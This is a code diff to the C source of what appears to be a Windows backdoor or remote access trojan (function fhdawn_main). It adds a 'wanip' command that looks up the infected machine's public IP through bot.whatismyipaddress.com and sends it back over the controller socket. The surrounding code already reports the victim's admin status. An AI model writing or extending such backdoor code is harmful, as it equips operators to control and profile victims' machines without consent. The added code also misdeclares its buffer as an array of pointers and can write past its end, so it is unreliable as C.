@@ -416,6 +416,28 @@ void fhdawn_main(void)
                 sockprintf(sockfd, "ADMIN:FALSE");
             }
 
+        } 
+
+        // Send WAN IP Address, last command
+
+        else if (strcmp(recvbuf, "wanip") == 0)
+        {   
+            char* wanip[BUFFER];
+            HINTERNET hInternet, hFile;
+            DWORD rSize;
+            if(InternetCheckConnection("http://www.google.com", 1, 0)){
+                memset(wanip, '\0', BUFFER);
+                hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+                hFile = InternetOpenUrl(hInternet, "http://bot.whatismyipaddress.com/", NULL, 0, INTERNET_FLAG_RELOAD, 0);
+                InternetReadFile(hFile, &wanip, sizeof(wanip), &rSize);
+                wanip[rSize] = '\0';
+
+                InternetCloseHandle(hFile);
+                InternetCloseHandle(hInternet);
+                sockprintf(sockfd, "WANIP:%s", wanip);
+            } else {
+                sockprintf(sockfd, "No Internet Connection detected ...");
+            }
         }
 
 
